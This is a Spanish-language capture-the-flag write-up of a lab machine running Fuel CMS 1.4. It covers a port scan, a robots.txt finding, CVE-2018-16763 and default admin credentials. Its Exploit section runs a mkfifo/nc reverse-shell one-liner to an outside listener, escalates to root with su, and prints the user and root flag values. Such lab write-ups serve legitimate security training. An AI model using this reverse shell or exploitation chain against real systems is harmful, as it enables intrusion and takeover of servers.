Escaneando podemos observar que la máquina solo tiene habilitado http
`80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:`

Podemos encontrar un `robots.txt` archivo, que revela un `/fuel/` directorio:
`$ curl -s 10.10.141.71/robots.txt
User-agent: *
Disallow: /fuel/`

### Versión obsoleta

Al acceder a http://10.10.141.71/, nos encontramos con una página de bienvenida predeterminada de Fuel CMS v1.4.

A fecha de redacción de este artículo, la versión más reciente es la 1.4.6, y el sitio presenta una vulnerabilidad conocida como CVE-2018-16763 ([https://www.exploit-db.com/exploits/47138](https://www.exploit-db.com/exploits/47138)), que permite la ejecución remota de código.

### Credenciales predeterminadas

En la documentación oficial ([https://docs.getfuelcms.com/general/security](https://docs.getfuelcms.com/general/security)), se indica que las credenciales predeterminadas son admin/admin. Estas pueden ser utilizadas, ya que la contraseña de administrador no ha sido modificada.

## Exploit
`$ python exploit.py` 
`cmd:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.54 1234 >/tmp/f`

`$ nc -nlvp 1234`
`Ncat: Version 7.80 ( https://nmap.org/ncat )`
`Ncat: Listening on :::1234`
`Ncat: Listening on 0.0.0.0:1234`
`Ncat: Connection from 10.10.5.126.`
`Ncat: Connection from 10.10.5.126:60882.`
`/bin/sh: 0: can't access tty; job control turned off`
`$ cd /home`
`$ ls`
`www-data`
`$ cd www-data`
`$ ls`
`flag.txt`
`$ cat flag.txt`
`6470e394cbf6dab6a91682cc8585059b`

`$ python -c 'import pty; pty.spawn("/bin/bash")'`

`www-data@ubuntu:/var/www/html$ su - root`
`su - root`
`Password: mememe`
`root@ubuntu:~# whoami`
`root`
`root@ubuntu:~# cd /root`
`cd /root`
`root@ubuntu:~# ls`
`ls`
`root.txt`
`root@ubuntu:~# cat root.txt`
`cat root.txt`
`b9bbcb33e11b80be759c4e844862482d`